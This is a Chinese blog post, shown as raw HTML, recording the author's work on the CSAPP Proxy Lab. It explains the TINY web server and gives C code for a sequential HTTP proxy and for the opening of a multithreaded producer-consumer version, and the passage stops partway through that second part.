<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/tiger.svg">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/tiger.svg">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/tiger.svg">
  <link rel="mask-icon" href="/images/tiger.svg" color="#222">
  <link rel="manifest" href="/images/tiger.svg">
  <meta name="msapplication-config" content="/images/tiger.svg">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"deconx.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"flat"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="天行健，君子以自强不息">
<meta property="og:type" content="website">
<meta property="og:title" content="潜龙勿用">
<meta property="og:url" content="https://deconx.top/index.html">
<meta property="og:site_name" content="潜龙勿用">
<meta property="og:description" content="天行健，君子以自强不息">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="西门吹水">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://deconx.top/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>潜龙勿用</title>
  


  <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?71065cef1d4b78e896256ce80437f4e3";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>




  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">潜龙勿用</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">12</span></a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">6</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Deconx" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://deconx.top/2022/04/13/CSAPP-Lab09/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/panda.jpg">
      <meta itemprop="name" content="西门吹水">
      <meta itemprop="description" content="天行健，君子以自强不息">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="潜龙勿用">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/13/CSAPP-Lab09/" class="post-title-link" itemprop="url">CSAPP-Lab09 Proxy Lab 记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-04-13 21:28:24" itemprop="dateCreated datePublished" datetime="2022-04-13T21:28:24+08:00">2022-04-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-10 23:57:51" itemprop="dateModified" datetime="2022-06-10T23:57:51+08:00">2022-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSAPP-Lab/" itemprop="url" rel="index"><span itemprop="name">CSAPP Lab</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="实验概览"><a href="#实验概览" class="headerlink" title="实验概览"></a>实验概览</h1><p>Web Proxy 是 Web 浏览器和服务器之间的一个中间程序。我们日常使用浏览器访问某个网站时，浏览器不是直接请求服务器来获取内容的，而是联系 Proxy，Proxy 转发请求到服务器，服务器回复 Proxy 后，Proxy 再将回复发送到浏览器。</p>
<p>即原来的客户端-服务器是这样：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412232840132.png" alt="image-20220412232840132"></p>
<p>加了 Proxy 变成这样</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412233236559.png" alt="image-20220412233236559"></p>
<p>本实验就是要实现一个支持<strong>多线程带缓存</strong>的 Web 代理，分为三个部分来进行：</p>
<ul>
<li><strong>Part 1</strong>：实现一个最基础的顺序代理</li>
<li><strong>Part 2</strong>：进一步优化，使代理支持多线程（生产者-消费者模型）</li>
<li><strong>Part 3</strong>：使用 LRU 策略缓存 Web 中的对象（读者-写者模型）</li>
</ul>
<h1 id="TINY-Web-服务器详解"><a href="#TINY-Web-服务器详解" class="headerlink" title="TINY Web 服务器详解"></a>TINY Web 服务器详解</h1><p>代理相对于客户端来说充当了服务端的角色，相对于服务端来说又充当了客户端的角色，所以可以大量利用书中讲解服务器的代码。</p>
<p>CSAPP 课本用 250 行代码为我们实现了一个非常简单的 Web 服务器，在做实验之前，深刻理解它是非常重要的。</p>
<p>首先要做的事就是解析 HTTP 请求</p>
<h2 id="解析-HTTP-请求"><a href="#解析-HTTP-请求" class="headerlink" title="解析 HTTP 请求"></a>解析 HTTP 请求</h2><p>HTTP 请求的组成是这样的：一个请求行，后面跟随零个或更多个请求报头，在跟随一个空的文本行来终止报头列表。请求行的形式是：<code>method URI version</code>，本服务器只支持 GET 方法</p>
<p>将 URI 解析出来后，需要判断请求的是静态内容还是动态内容，分别执行。给出函数<code>doit</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412194849510.png" alt="image-20220412194849510"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413072204676.png" alt="image-20220413072204676"></p>
<p>解析 URI 都是细节上的问题，这里不再分析</p>
<h2 id="提供静态内容"><a href="#提供静态内容" class="headerlink" title="提供静态内容"></a>提供静态内容</h2><p>一个 HTTP 响应的组成是这样的：一个响应行，后面跟随着零个或更多的相应报头，再跟随着一个终止报头的空行，随后跟随响应主体，相应行的格式为<code>version status-code status-massage</code>。于是给出函数<code>serve_static</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412194347578.png" alt="image-20220412194347578"></p>
<h2 id="提供动态内容"><a href="#提供动态内容" class="headerlink" title="提供动态内容"></a>提供动态内容</h2><p>TINY 派生一个子进程并在子进程的上下文中运行一个 CGI 程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412195522104.png" alt="image-20220412195522104"></p>
<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220412233611252.png" alt="image-20220412233611252"></p>
<h1 id="Part-1-Implementing-A-sequential-web-proxy"><a href="#Part-1-Implementing-A-sequential-web-proxy" class="headerlink" title="Part 1: Implementing A sequential web proxy"></a>Part 1: Implementing A sequential web proxy</h1><p>要求：</p>
<ul>
<li><p>实现一个处理 HTTP&#x2F;1.0 GET 请求的基本顺序 web 代理</p>
</li>
<li><p>如果接收到一个浏览器请求为 HTTP&#x2F;1.1 版本，则应将它作为 HTTP&#x2F;1.0 请求转发</p>
</li>
<li><p>转发合法的 HTTP 请求</p>
<ul>
<li>假设请求为 <code>GET http://www.cmu.edu/hub/index.html HTTP/1.1</code></li>
<li>则主机名为 <code>www.cmu.edu</code></li>
<li>请求的页面为 <code>/hub/index.html</code></li>
<li>HTTP 请求每行以 <code>\r\n</code> 结束，以一个空行 <code>\r\n</code> 结尾</li>
</ul>
</li>
<li><p>代理发送的请求的 header 为：</p>
<ul>
<li><p><code>Host</code>: 如 <code>Host: www.cmu.edu</code></p>
</li>
<li><p><code>User-Agent</code>: 如 <code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</code></p>
</li>
<li><p><code>Connection</code>: 必须发送 <code>Connection: close</code></p>
</li>
<li><p><code>Proxy-Connection</code>: 必须发送 <code>Proxy-Connection: close</code></p>
</li>
</ul>
</li>
<li><p>要处理过早关闭的连接，即必须捕获 SIGPIPE 信号</p>
</li>
</ul>
<p>这部分没什么好说的</p>
<h2 id="等待客户端连接"><a href="#等待客户端连接" class="headerlink" title="等待客户端连接"></a>等待客户端连接</h2><p>首先是我们的<code>main</code>函数，不断等待客户端的连接，代码与 TINY服务器代码完全相同，不再讲解</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage :%s &lt;port&gt; \n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    signal(SIGPIPE, sigpipe_handler);	<span class="comment">//捕获SIGPIPE信号</span></span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line"></span><br><span class="line">        Getnameinfo((SA *)&amp;clientaddr, clientlen, hostname, MAXLINE, port, MAXLINE, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Accepted connection from (%s %s).\n&quot;</span>, hostname, port);</span><br><span class="line"></span><br><span class="line">        doit(connfd);</span><br><span class="line">        <span class="comment">//关闭客户端的连接描述符</span></span><br><span class="line">        Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="转发与回复"><a href="#转发与回复" class="headerlink" title="转发与回复"></a>转发与回复</h2><p><code>doit</code>函数前半部分与 TINY 服务器相似，不同的是将后半部分的请求处理改为转发给服务器，再将服务器的回复回复给客户端</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> connfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> server[MAXLINE];</span><br><span class="line"> </span><br><span class="line">    <span class="type">rio_t</span> rio, server_rio;</span><br><span class="line"></span><br><span class="line">    Rio_readinitb(&amp;rio, connfd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE);</span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Proxy does not implement the method&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Uri</span> *<span class="title">uri_data</span> =</span> (<span class="keyword">struct</span> Uri *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Uri));</span><br><span class="line">    <span class="comment">//解析uri</span></span><br><span class="line">    parse_uri(uri, uri_data);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//设置header</span></span><br><span class="line">    build_header(server, uri_data, &amp;rio);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//连接服务器</span></span><br><span class="line">    <span class="type">int</span> serverfd = Open_clientfd(uri_data-&gt;host, uri_data-&gt;port);</span><br><span class="line">    <span class="keyword">if</span> (serverfd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;connection failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//转发给服务器</span></span><br><span class="line">    Rio_readinitb(&amp;server_rio, serverfd);</span><br><span class="line">    Rio_writen(serverfd, server, <span class="built_in">strlen</span>(server));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    <span class="comment">//回复给客户端</span></span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;server_rio, buf, MAXLINE)) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;proxy received %d bytes,then send\n&quot;</span>, (<span class="type">int</span>)n);</span><br><span class="line">        Rio_writen(connfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//关闭服务器描述符</span></span><br><span class="line">    Close(serverfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="解析uri"><a href="#解析uri" class="headerlink" title="解析uri"></a>解析uri</h2><p>根据 uri 结构定义一个结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Uri</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> host[MAXLINE]; <span class="comment">//hostname</span></span><br><span class="line">    <span class="type">char</span> port[MAXLINE]; <span class="comment">//端口</span></span><br><span class="line">    <span class="type">char</span> path[MAXLINE]; <span class="comment">//路径</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>解析函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//解析uri</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="keyword">struct</span> Uri *uri_data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *hostpose = <span class="built_in">strstr</span>(uri, <span class="string">&quot;//&quot;</span>);</span><br><span class="line">    <span class="comment">//默认端口为80</span></span><br><span class="line">    <span class="keyword">if</span> (hostpose == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *pathpose = <span class="built_in">strstr</span>(uri, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (pathpose != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">strcpy</span>(uri_data-&gt;path, pathpose);</span><br><span class="line">        <span class="built_in">strcpy</span>(uri_data-&gt;port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> *portpose = <span class="built_in">strstr</span>(hostpose + <span class="number">2</span>, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (portpose != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> tmp;</span><br><span class="line">            <span class="built_in">sscanf</span>(portpose + <span class="number">1</span>, <span class="string">&quot;%d%s&quot;</span>, &amp;tmp, uri_data-&gt;path);</span><br><span class="line">            <span class="built_in">sprintf</span>(uri_data-&gt;port, <span class="string">&quot;%d&quot;</span>, tmp);</span><br><span class="line">            *portpose = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> *pathpose = <span class="built_in">strstr</span>(hostpose + <span class="number">2</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (pathpose != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">strcpy</span>(uri_data-&gt;path, pathpose);</span><br><span class="line">                <span class="built_in">strcpy</span>(uri_data-&gt;port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">                *pathpose = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">strcpy</span>(uri_data-&gt;host, hostpose + <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="测试与结果"><a href="#测试与结果" class="headerlink" title="测试与结果"></a>测试与结果</h2><p>不知道为什么，这个<code>driver.sh</code>在 wsl 上总是出问题，只好拿出我的 vm 虚拟机来跑了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413114835337.png" alt="image-20220413114835337"></p>
<p>40 分全部拿到！</p>
<h1 id="Part-2-Dealing-with-multiple-concurrent-requests"><a href="#Part-2-Dealing-with-multiple-concurrent-requests" class="headerlink" title="Part 2: Dealing with multiple concurrent requests"></a>Part 2: Dealing with multiple concurrent requests</h1><p>设计多线程并发处理客户端请求，这里采用预线程化的技术，如图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Deconx/ImgHosting/Deconx-pic/image-20220413115833749.png" alt="image-20220413115833749"></p>
<p>这是一个生产者-消费者模型，我们回顾一下：</p>
<h2 id="生产者-消费者模型"><a href="#生产者-消费者模型" class="headerlink" title="生产者-消费者模型"></a>生产者-消费者模型</h2><p>生产者和消费者线程共享一个有 n 个槽的优先缓冲区，生产者反复地生成新的项目，并把它们插入到缓冲区中。消费者线程不断从缓冲区中取出，这些项目然后使用它们。因为插入和取出项目都涉及更新共享变量，所以我们必须保证对缓冲区地访问是互斥的，并调度对缓冲区地访问：</p>
<ul>
<li>如果没有槽位：生产者必须等待</li>
<li>如果没有项目：消费者必须等待</li>
</ul>
<p>在预线程化的服务器中，客户端就是生产者，不断产生连接；Proxy 就是消费者，不断选中客户端连接</p>
<p>为此，开发一个 SBUF 包来实现这个缓冲区地调度。缓冲区设计：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> *buf;          <span class="comment">/* Buffer array */</span>         </span><br><span class="line">    <span class="type">int</span> n;             <span class="comment">/* Maximum number of slots */</span></span><br><span class="line">    <span class="type">int</span> front;         <span class="comment">/* buf[(front+1)%n] is first item */</span></span><br><span class="line">    <span class="type">int</span> rear;          <span class="comment">/* buf[rear%n] is last item */</span></span><br><span class="line">    <span class="type">sem_t</span> mutex;       <span class="comment">/* Protects accesses to buf */</span></span><br><span class="line">    <span class="type">sem_t</span> slots;       <span class="comment">/* Counts available slots */</span></span><br><span class="line">    <span class="type">sem_t</span> items;       <span class="comment">/* Counts available items */</span></span><br><span class="line">&#125; <span class="type">sbuf_t</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>其中有 3 个信号量<ul>
<li>mutex 初始化为 1，保证对缓冲区的访问是互斥的</li>
<li>slots 初始化为 n，记录槽位</li>
<li>items 初始化为 0，记录项目数</li>
</ul>
</li>
</ul>
<p>由此，设计客户端向缓冲区插入函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sbuf_insert</span><span class="params">(<span class="type">sbuf_t</span> *sp, <span class="type">int</span> item)</span></span><br><span class="line">&#123;</span><br><span class="line">    P(&amp;sp-&gt;slots);                          <span class="comment">/* Wait for available slot */</span></span><br><span class="line">    P(&amp;sp-&gt;mutex);                          <span class="comment">/* Lock the buffer */</span></span><br><span class="line">    sp-&gt;buf[(++sp-&gt;rear)%(sp-&gt;n)] = item;   <span class="comment">/* Insert the item */</span></span><br><span class="line">    V(&amp;sp-&gt;mutex);                          <span class="comment">/* Unlock the buffer */</span></span><br><span class="line">    V(&amp;sp-&gt;items);                          <span class="comment">/* Announce available item */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先有一个对 slots 的 P 操作，保证了如果槽位已满，则客户端被挂起，不会继续往缓冲区写入请求</li>
<li>然后是一个 mutex 的 P 操作，保证了对缓冲区互斥的访问</li>
<li>缓冲区插入完成后，释放所有的锁</li>
</ul>
<p>设计 Proxy 从缓冲区读入的函数：</p>
